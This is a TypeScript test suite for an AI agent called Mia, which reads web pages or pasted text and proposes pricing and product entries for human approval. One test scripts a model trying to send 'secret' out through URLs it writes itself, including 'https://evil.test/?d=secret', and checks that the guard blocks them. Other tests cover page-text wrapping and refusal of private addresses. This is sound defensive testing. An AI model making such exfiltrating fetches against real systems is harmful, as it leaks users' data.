import { afterAll, beforeEach, expect, it } from "vitest";
import type { AgentMessage, AgentModel, AgentStepRequest, AgentStepResult } from "@/contexts/ai/application/agent-ports";
import { AiError } from "@/contexts/ai/domain/ai-error";
import { addBrainItem, getBrainItem } from "@/contexts/brain/application/brain-items";
import { drizzleBrainStore } from "@/contexts/brain/infrastructure/drizzle-brain-store";
import type { AiStatus } from "@/contexts/integrations/domain/ai-status";
import { pruneHistory, DEFAULT_RETENTION } from "@/platform/jobs/prune";
import { type Actor } from "@/shared/errors";
import { createTestOrg, describeDb, dropOrgs, testSql, useTestEnv, type TestOrg } from "@/test-support/db";
import type { PageReader } from "../../application/mia-ports";
import { acceptSuggestion, cancelRun, dismissSuggestion, openSuggestions, recentRuns, startBrainFill, startSort, updateMiaSettings, type MiaDeps } from "../../application/mia-use-cases";
import { createMiaRunJob } from "../../application/mia-worker";
import { miaDeps, miaWorkerDeps } from "../composition";

const SITE = "https://acme-mia.test/";
const PRICING = "https://acme-mia.test/pricing";
const PAGE_TEXT = "The Starter plan costs USD 99 per month.";

interface Call {
  tool: string;
  input: unknown;
}

type Script = Array<Call[] | Error | "text">;

/** Walks a fixed list of steps and runs the tools the way the SDK adapter does: a throw becomes the call's failed result. */
function scripted(script: Script) {
  const seen: { tools: string[][]; messages: AgentMessage[][]; results: string[]; errors: string[]; active: Array<readonly string[] | undefined> } = { tools: [], messages: [], results: [], errors: [], active: [] };
  let index = 0;
  const model: AgentModel = {
    provider: "fake",
    model: "scripted",
    async step(request: AgentStepRequest): Promise<AgentStepResult> {
      seen.tools.push(request.tools.map((t) => t.name));
      seen.messages.push(request.messages);
      seen.active.push(request.activeTools);
      const planned = script[index++] ?? [{ tool: "finish", input: {} }];
      if (planned instanceof Error) throw planned;
      const calls: AgentStepResult["toolCalls"] = [];
      if (planned !== "text") {
        for (const call of planned) {
          const tool = request.tools.find((t) => t.name === call.tool);
          if (!tool) throw new Error(`This run has no tool ${call.tool}.`);
          try {
            seen.results.push(await (tool.execute as (input: unknown) => Promise<string>)(call.input));
            calls.push({ name: call.tool, failed: false });
          } catch (error) {
            seen.errors.push((error as Error).message);
            calls.push({ name: call.tool, failed: true });
          }
        }
      }
      return { messages: [...request.messages, { role: "assistant", content: `step ${index}` }], toolCalls: calls, stop: planned === "text" ? "end" : "tools", usage: { inputTokens: 1000, outputTokens: 100, cacheReadTokens: 500, cacheWriteTokens: 10 } };
    },
  };
  return { model, seen, calls: () => index };
}

const pages: PageReader = {
  async read(url) {
    return { url, title: "Acme", text: PAGE_TEXT, links: [PRICING] };
  },
};

const plan = (source: string, monthly = 99) => ({
  tool: "suggest_item",
  input: {
    kind: "price_book",
    fields: [
      { key: "entryName", value: "Starter", quote: "The Starter plan", source },
      { key: "pricing.currency", value: "USD", quote: "USD 99 per month", source },
      { key: "monthlyPrice", value: monthly, quote: "USD 99 per month", source },
    ],
  },
});
const FETCH: Call = { tool: "fetch_page", input: { url: SITE } };
const FINISH: Call = { tool: "finish", input: {} };

describeDb("Mia runs", () => {
  useTestEnv();
  const sql = testSql({ max: 2 });
  const orgs: TestOrg[] = [];

  async function fixture(role = "member"): Promise<Actor> {
    const org = await createTestOrg(sql, "Mia", role);
    orgs.push(org);
    return { userId: org.userId, organizationId: org.organizationId, role };
  }

  const deps = (): MiaDeps => ({ ...miaDeps(), aiStatus: async () => ({ state: "on" }) as unknown as AiStatus, kick: () => undefined });

  /** One pass of the job with a scripted model. */
  async function pass(model: AgentModel, budgetMs = 120_000) {
    const models = { forOrganization: async () => model, status: async () => ({ state: "on" }) as unknown as AiStatus };
    return createMiaRunJob(miaWorkerDeps({ models, pages, kick: () => undefined })).run({ deadline: Date.now() + budgetMs, now: () => new Date() });
  }

  const runRow = async (id: string) => (await sql`select * from mia_runs where id = ${id}`)[0];
  const suggestionsOf = (org: string) => sql`select * from mia_suggestions where organization_id = ${org} order by step_count, ordinal`;

  beforeEach(async () => {
    // A run a test left behind must not take the next test's model.
    await sql`update mia_runs set status = 'cancelled', claim_token = null where status in ('queued', 'running', 'waiting_limit')`;
  });

  afterAll(async () => {
    await sql`delete from mia_suggestions`;
    await sql`delete from mia_runs`;
    await dropOrgs(sql, orgs);
    await sql.end();
  });

  it("reads a site, stores a suggestion and keeps no page text once it ends", async () => {
    const actor = await fixture();
    const { id } = await startBrainFill(deps(), actor, { url: SITE });
    const { model, seen } = scripted([[FETCH], [plan(SITE)], [FINISH]]);
    await pass(model);

    const run = await runRow(id);
    expect(run).toMatchObject({ status: "succeeded", step_count: 3, suggestion_count: 1, checkpoint: null, input: {}, claim_token: null, provider: "fake" });
    expect(seen.errors).toEqual([]);
    expect(seen.results[0]).toContain("<untrusted_page_");
    const rows = await suggestionsOf(actor.organizationId);
    expect(rows).toHaveLength(1);
    expect(rows[0]).toMatchObject({ type: "new_item", status: "open", kind: "price_book", title: "Starter", run_id: id });
    expect(rows[0].payload.fields.monthlyPrice).toEqual({ value: 99, quote: "USD 99 per month", sourceUrl: SITE, unverified: false });
    const [usage] = await sql`select * from mia_usage_daily where organization_id = ${actor.organizationId}`;
    expect(usage).toMatchObject({ input_tokens: 3000, output_tokens: 300, cache_read_tokens: 1500, cache_write_tokens: 30 });
    // Cache reads stay out of what counts against the limits.
    expect(run.used_tokens).toBe(3330);
    const [audit] = await sql`select actor_user_id from audit_log where organization_id = ${actor.organizationId} and action = 'mia.run_started'`;
    expect(audit.actor_user_id).toBe(actor.userId);
  });

  it("gives a web run no way to read Brain, and a text run no way to the web", async () => {
    const url = await fixture();
    await startBrainFill(deps(), url, { url: SITE });
    const web = scripted([[FINISH]]);
    await pass(web.model);
    expect(web.seen.tools[0]).toEqual(["fetch_page", "suggest_item", "finish"]);

    const text = await fixture();
    await startBrainFill(deps(), text, { text: "We sell things." });
    const pasted = scripted([[FINISH]]);
    await pass(pasted.model);
    expect(pasted.seen.tools[0]).toEqual(["suggest_item", "finish"]);
  });

  it("opens only the first address and the links it found, so a model cannot write a URL that carries data out", async () => {
    const actor = await fixture();
    await startBrainFill(deps(), actor, { url: SITE });
    const { model, seen } = scripted([[{ tool: "fetch_page", input: { url: "https://evil.test/?d=secret" } }], [FETCH], [{ tool: "fetch_page", input: { url: `${PRICING}?d=secret` } }], [{ tool: "fetch_page", input: { url: PRICING } }], [FINISH]]);
    await pass(model);
    expect(seen.errors).toEqual(["That address was not given to you and is not a listed link.", "That address was not given to you and is not a listed link."]);
    expect(seen.results.filter((r) => r.startsWith("Address:"))).toHaveLength(2);
  });

  it("refuses a sentence the page does not hold, and marks a number the sentence does not state", async () => {
    const actor = await fixture();
    await startBrainFill(deps(), actor, { url: SITE });
    const made = { tool: "suggest_item", input: { kind: "product", fields: [{ key: "productName", value: "Starter", quote: "This sentence was invented", source: SITE }] } };
    const { model, seen } = scripted([[FETCH], [made], [plan(SITE, 89)], [FINISH]]);
    await pass(model);
    expect(seen.errors).toEqual(["Product name: that sentence is not in the source. Quote it exactly."]);
    const rows = await suggestionsOf(actor.organizationId);
    expect(rows).toHaveLength(1);
    expect(rows[0].payload.fields.monthlyPrice.unverified).toBe(true);
  });

  it("continues from the stored conversation after a restart, and repeats no paid call", async () => {
    const actor = await fixture();
    const { id } = await startBrainFill(deps(), actor, { url: SITE });
    const first = scripted([[FETCH], [plan(SITE)]]);
    // Room for no second step: the budget ends, and the run goes back to the queue with what it has.
    let passes = 0;
    const slow: AgentModel = {
      ...first.model,
      async step(request) {
        await new Promise((resolve) => setTimeout(resolve, 700));
        return first.model.step(request);
      },
    };
    const models = { forOrganization: async () => slow, status: async () => ({ state: "on" }) as unknown as AiStatus };
    const job = createMiaRunJob(miaWorkerDeps({ models, pages, kick: () => void passes++ }));
    await job.run({ deadline: Date.now() + 40_500, now: () => new Date() });
    expect(passes).toBe(1);
    const stopped = await runRow(id);
    expect(stopped).toMatchObject({ status: "queued", claim_token: null });
    expect(stopped.step_count).toBeGreaterThanOrEqual(1);
    const done = stopped.step_count;

    const second = scripted([[FINISH]]);
    await pass(second.model);
    expect(await runRow(id)).toMatchObject({ status: "succeeded", step_count: done + 1 });
    // The new worker starts from what the first one stored, and the page it read still counts as a source.
    expect(second.seen.messages[0].length).toBeGreaterThan(1);
  });

  it("writes nothing from a step that failed, so a retry leaves one suggestion", async () => {
    const actor = await fixture();
    const { id } = await startBrainFill(deps(), actor, { url: SITE });
    const { model } = scripted([[FETCH], new AiError("The AI service is unavailable (status 503).", "transient")]);
    await pass(model);
    const waiting = await runRow(id);
    expect(waiting).toMatchObject({ status: "queued", failures: 1, error: "The AI service is unavailable (status 503)." });
    expect(new Date(waiting.next_attempt_at).getTime()).toBeGreaterThan(Date.now());
    // A failed call still counts: it was sent, and a failing provider must not run without limit.
    expect(waiting.used_tokens).toBeGreaterThan(1110);

    await sql`update mia_runs set next_attempt_at = now() - interval '1 minute' where id = ${id}`;
    const retry = scripted([[plan(SITE)], [FINISH]]);
    await pass(retry.model);
    expect(await runRow(id)).toMatchObject({ status: "succeeded", failures: 0, error: null });
    expect(await suggestionsOf(actor.organizationId)).toHaveLength(1);
  });

  it("ends a run on a failure no retry can fix", async () => {
    const actor = await fixture();
    const { id } = await startBrainFill(deps(), actor, { text: "Some text." });
    await pass(scripted([new AiError("Anthropic rejected the API key. Replace it in Settings, Integrations.", "permanent")]).model);
    expect(await runRow(id)).toMatchObject({ status: "failed", failure_kind: "permanent", checkpoint: null, input: {} });
  });

  it("gives up after a third failure", async () => {
    const actor = await fixture();
    const { id } = await startBrainFill(deps(), actor, { text: "Some text." });
    for (let i = 0; i < 3; i++) {
      await pass(scripted([new AiError("The AI request timed out.", "transient")]).model);
      await sql`update mia_runs set next_attempt_at = now() - interval '1 minute' where id = ${id} and status = 'queued'`;
    }
    expect(await runRow(id)).toMatchObject({ status: "failed", failure_kind: "transient" });
  });

  it("takes over a run whose worker died, and counts it, so a run that kills workers ends", async () => {
    const actor = await fixture();
    const { id } = await startBrainFill(deps(), actor, { text: "Some text." });
    await sql`update mia_runs set status = 'running', claim_token = gen_random_uuid(), lease_expires_at = now() - interval '1 minute', failures = 2 where id = ${id}`;
    await pass(scripted([[FINISH]]).model);
    expect(await runRow(id)).toMatchObject({ status: "failed", failure_kind: "attempts" });
  });

  it("a worker that lost its claim changes nothing", async () => {
    const actor = await fixture();
    const { id } = await startBrainFill(deps(), actor, { text: "We sell Widgets." });
    const suggest = { tool: "suggest_item", input: { kind: "product", fields: [{ key: "productName", value: "Widgets", quote: "We sell Widgets.", source: "input" }] } };
    const { model } = scripted([[suggest]]);
    const stolen: AgentModel = {
      ...model,
      async step(request) {
        const result = await model.step(request);
        await sql`update mia_runs set claim_token = gen_random_uuid(), attempts = attempts + 1 where id = ${id}`;
        return result;
      },
    };
    await pass(stolen);
    expect(await suggestionsOf(actor.organizationId)).toHaveLength(0);
    expect((await runRow(id)).step_count).toBe(0);
  });

  it("reminds a model that only writes text once, then ends the run", async () => {
    const actor = await fixture();
    const { id } = await startBrainFill(deps(), actor, { text: "Some text." });
    const { model, seen } = scripted(["text", "text"]);
    await pass(model);
    expect(seen.messages[1].at(-1)).toMatchObject({ role: "user", content: expect.stringContaining("Use a tool") });
    expect(await runRow(id)).toMatchObject({ status: "failed", failure_kind: "no_tool_call" });
  });

  it("limits the last step, and keeps what a run found when it reaches its limit", async () => {
    const actor = await fixture();
    const { id } = await startBrainFill(deps(), actor, { text: "We sell Widgets." });
    const suggest = { tool: "suggest_item", input: { kind: "product", fields: [{ key: "productName", value: "Widgets", quote: "We sell Widgets.", source: "input" }] } };
    await sql`update mia_runs set used_tokens = 199000 where id = ${id}`;
    const { model, seen } = scripted([[suggest], []]);
    await pass(model);
    expect(seen.active[0]).toEqual(["suggest_item", "finish"]);
    expect(await runRow(id)).toMatchObject({ status: "succeeded", suggestion_count: 1 });
  });

  it("stops a job at the daily share and refuses a new one, leaving room for a person", async () => {
    const actor = await fixture("admin");
    await updateMiaSettings(deps(), actor, { dailyTokenLimit: 1000 });
    await expect(startBrainFill(deps(), actor, { text: "Some text." })).rejects.toMatchObject({ details: { code: "mia_daily_limit" } });

    await updateMiaSettings(deps(), actor, { dailyTokenLimit: 1_000_000 });
    const { id } = await startBrainFill(deps(), actor, { text: "Some text." });
    await sql`insert into mia_usage_daily (organization_id, day, input_tokens) values (${actor.organizationId}, (now() at time zone 'utc')::date, 900000)`;
    const { model, calls } = scripted([[FINISH]]);
    await pass(model);
    expect(calls()).toBe(0);
    const waiting = await runRow(id);
    expect(waiting.status).toBe("waiting_limit");
    expect(new Date(waiting.next_attempt_at).getUTCHours()).toBe(0);
  });

  it("takes one site at a time, and refuses an address it may not read", async () => {
    const actor = await fixture();
    await expect(startBrainFill(deps(), actor, { url: "http://acme-mia.test/" })).rejects.toThrow(/public https/);
    await expect(startBrainFill(deps(), actor, { url: "https://10.0.0.1/" })).rejects.toThrow(/public https/);
    await startBrainFill(deps(), actor, { url: SITE });
    await expect(startBrainFill(deps(), actor, { text: "More." })).rejects.toMatchObject({ details: { code: "mia_run_active" } });
  });

  it("does not start while AI is off, and says why", async () => {
    const actor = await fixture();
    const off = { ...deps(), aiStatus: async () => ({ state: "no_key" }) as unknown as AiStatus };
    await expect(startBrainFill(off, actor, { text: "Text." })).rejects.toMatchObject({ details: { code: "mia_off" } });
  });

  it("stops a waiting job at once and a running one at its next step", async () => {
    const actor = await fixture();
    const waiting = await startBrainFill(deps(), actor, { text: "Some text." });
    await cancelRun(deps(), actor, waiting.id);
    expect(await runRow(waiting.id)).toMatchObject({ status: "cancelled", input: {} });
    await expect(cancelRun(deps(), actor, waiting.id)).rejects.toThrow(/already ended/);

    const running = await startBrainFill(deps(), actor, { text: "Some text." });
    const { model, calls } = scripted([[], [FINISH]]);
    const stopping: AgentModel = {
      ...model,
      async step(request) {
        const result = await model.step(request);
        await cancelRun(deps(), actor, running.id);
        return result;
      },
    };
    await pass(stopping);
    expect(calls()).toBe(1);
    expect(await runRow(running.id)).toMatchObject({ status: "cancelled", checkpoint: null });
  });

  it("keeps one organization's runs and suggestions from another", async () => {
    const actor = await fixture();
    const other = await fixture();
    const { id } = await startBrainFill(deps(), actor, { url: SITE });
    await expect(cancelRun(deps(), other, id)).rejects.toThrow(/already ended/);
    await pass(scripted([[FETCH], [plan(SITE)], [FINISH]]).model);
    const [row] = await suggestionsOf(actor.organizationId);
    await expect(dismissSuggestion(deps(), other, row.id)).rejects.toThrow(/not found/i);
    await expect(acceptSuggestion(deps(), other, row.id, { fields: {} })).rejects.toThrow(/not found/i);
    expect((await openSuggestions(deps(), other)).total).toBe(0);
    expect(await recentRuns(deps(), other)).toEqual([]);
  });

  async function suggested(actor: Actor, monthly = 99) {
    await startBrainFill(deps(), actor, { url: SITE });
    await pass(scripted([[FETCH], [plan(SITE, monthly)], [FINISH]]).model);
    return (await suggestionsOf(actor.organizationId)).at(-1)!;
  }

  it("saves an accepted suggestion as the person's own item, and only once", async () => {
    const actor = await fixture();
    const row = await suggested(actor);
    const { rows } = await openSuggestions(deps(), actor);
    expect(rows[0]).toMatchObject({ id: row.id, title: "Starter", fields: { entryName: "Starter", monthlyPrice: 99, pricing: { currency: "USD" } } });

    const { itemId } = await acceptSuggestion(deps(), actor, row.id, { fields: rows[0].fields });
    const item = await getBrainItem(drizzleBrainStore, actor, itemId);
    expect(item).toMatchObject({ kind: "price_book", title: "Starter", version: 1, alwaysInclude: false, content: expect.stringContaining("Monthly price: USD 99") });
    const [audit] = await sql`select actor_user_id from audit_log where organization_id = ${actor.organizationId} and action = 'brain.item_created'`;
    expect(audit.actor_user_id).toBe(actor.userId);
    expect((await suggestionsOf(actor.organizationId))[0]).toMatchObject({ status: "accepted", decided_by: actor.userId, created_item_id: itemId });
    await expect(acceptSuggestion(deps(), actor, row.id, { fields: rows[0].fields })).rejects.toMatchObject({ details: { code: "mia_decided" } });
  });

  it("lets two people accept at once and saves one item", async () => {
    const actor = await fixture();
    const row = await suggested(actor);
    const { rows } = await openSuggestions(deps(), actor);
    const results = await Promise.allSettled([acceptSuggestion(deps(), actor, row.id, { fields: rows[0].fields }), acceptSuggestion(deps(), actor, row.id, { fields: rows[0].fields })]);
    expect(results.filter((r) => r.status === "fulfilled")).toHaveLength(1);
    const [{ total }] = await sql`select count(*)::int as total from knowledge_documents where organization_id = ${actor.organizationId}`;
    expect(total).toBe(1);
  });

  it("refuses Mia's unchecked number until a person ticks or changes it", async () => {
    const actor = await fixture();
    const row = await suggested(actor, 89);
    const { rows } = await openSuggestions(deps(), actor);
    await expect(acceptSuggestion(deps(), actor, row.id, { fields: rows[0].fields })).rejects.toMatchObject({ details: { code: "mia_unconfirmed", fields: ["monthlyPrice"] } });
    expect((await suggestionsOf(actor.organizationId))[0].status).toBe("open");
    const { itemId } = await acceptSuggestion(deps(), actor, row.id, { fields: { ...rows[0].fields, monthlyPrice: 99 } });
    expect((await getBrainItem(drizzleBrainStore, actor, itemId)).structuredData).toMatchObject({ monthlyPrice: 99 });
  });

  it("leaves a suggestion open when the save fails, so nothing is half done", async () => {
    const actor = await fixture();
    const row = await suggested(actor);
    await expect(acceptSuggestion(deps(), actor, row.id, { fields: { entryName: "" } })).rejects.toThrow(/required/);
    expect((await suggestionsOf(actor.organizationId))[0]).toMatchObject({ status: "open", decided_at: null });
  });

  it("offers a change to an item of the same name, keeping what the suggestion does not name, and refuses a stale form", async () => {
    const actor = await fixture();
    const { id: existing } = await addBrainItem(drizzleBrainStore, actor, { kind: "price_book", fields: { entryName: "starter", pricing: { currency: "USD" }, monthlyPrice: 79, notes: "Keep me" } });
    const row = await suggested(actor);
    expect(row).toMatchObject({ type: "item_change", target_item_id: existing });
    const { rows } = await openSuggestions(deps(), actor);
    expect(rows[0].rows.find((r) => r.key === "monthlyPrice")).toMatchObject({ current: "USD 79", proposed: "99" });
    expect(rows[0].fields).toMatchObject({ notes: "Keep me", monthlyPrice: 99 });
    // A person's edit after the form opened.
    await drizzleBrainStore.update(actor.organizationId, actor.userId, existing, () => ({ description: "Edited" }));
    await expect(acceptSuggestion(deps(), actor, row.id, { fields: rows[0].fields, revision: rows[0].revision as number })).rejects.toMatchObject({ details: { code: "stale_version" } });
    expect((await suggestionsOf(actor.organizationId))[0].status).toBe("open");

    // Reopened: the form reads the new revision and the save goes through.
    const again = (await openSuggestions(deps(), actor)).rows[0];
    await acceptSuggestion(deps(), actor, row.id, { fields: again.fields, revision: again.revision as number });
    expect((await getBrainItem(drizzleBrainStore, actor, existing)).structuredData).toMatchObject({ notes: "Keep me", monthlyPrice: 99 });
  });

  it("sorts an old document with one suggestion, and the pasted text stays as the earlier version", async () => {
    const actor = await fixture();
    const content = "Widgets cost USD 10 per month.";
    const doc = await sql.begin(async (tx) => {
      const [row] = await tx`insert into knowledge_documents (organization_id, title, kind) values (${actor.organizationId}, 'Old pricing', 'unsorted') returning id`;
      await tx`insert into knowledge_document_versions (organization_id, document_id, version, content) values (${actor.organizationId}, ${row.id}, 1, ${content})`;
      return row.id as string;
    });
    await startSort(deps(), actor, doc);
    await expect(startSort(deps(), actor, doc)).rejects.toMatchObject({ details: { code: "mia_run_active" } });
    const suggest = {
      tool: "suggest_item",
      input: {
        kind: "price_book",
        fields: [
          { key: "entryName", value: "Widgets", quote: content, source: "input" },
          { key: "pricing.currency", value: "USD", quote: content, source: "input" },
          { key: "monthlyPrice", value: 20, quote: content, source: "input" },
        ],
      },
    };
    const { model, seen } = scripted([[suggest, suggest], [FINISH]]);
    await pass(model);
    expect(seen.errors).toEqual(["This document takes one suggestion. Call finish."]);
    const { rows } = await openSuggestions(deps(), actor);
    expect(rows[0]).toMatchObject({ sorting: true, type: "item_change", targetItemId: doc });
    // Mia changed the price while sorting, the mistake that kept this manual: a person has to catch it.
    expect(rows[0].rows.find((r) => r.key === "monthlyPrice")?.unverified).toBe(true);
    await expect(acceptSuggestion(deps(), actor, rows[0].id, { fields: rows[0].fields, revision: rows[0].revision as number })).rejects.toMatchObject({ details: { code: "mia_unconfirmed" } });
    await acceptSuggestion(deps(), actor, rows[0].id, { fields: { ...rows[0].fields, monthlyPrice: 10 }, revision: rows[0].revision as number });
    const item = await getBrainItem(drizzleBrainStore, actor, doc);
    expect(item).toMatchObject({ kind: "price_book", legacy: false, version: 2, title: "Widgets" });
    const [old] = await sql`select content from knowledge_document_versions where document_id = ${doc} and version = 1`;
    expect(old.content).toBe(content);
    await expect(startSort(deps(), actor, doc)).rejects.toThrow(/sorted already/);
  });

  it("prunes finished runs and decided suggestions, and a suggestion still open survives its run", async () => {
    const actor = await fixture();
    const { id } = await startBrainFill(deps(), actor, { url: SITE });
    await pass(scripted([[FETCH], [plan(SITE)], [FINISH]]).model);
    await sql`update mia_runs set finished_at = now() - interval '60 days' where id = ${id}`;
    await pruneHistory({ now: new Date(), retention: DEFAULT_RETENTION, deadline: Date.now() + 30_000 });
    expect(await sql`select id from mia_runs where id = ${id}`).toHaveLength(0);
    const rows = await suggestionsOf(actor.organizationId);
    expect(rows[0]).toMatchObject({ status: "open", run_id: null, organization_id: actor.organizationId });

    await sql`update mia_suggestions set status = 'dismissed', decided_at = now() - interval '60 days' where id = ${rows[0].id}`;
    await pruneHistory({ now: new Date(), retention: DEFAULT_RETENTION, deadline: Date.now() + 30_000 });
    expect(await suggestionsOf(actor.organizationId)).toHaveLength(0);
  });
});
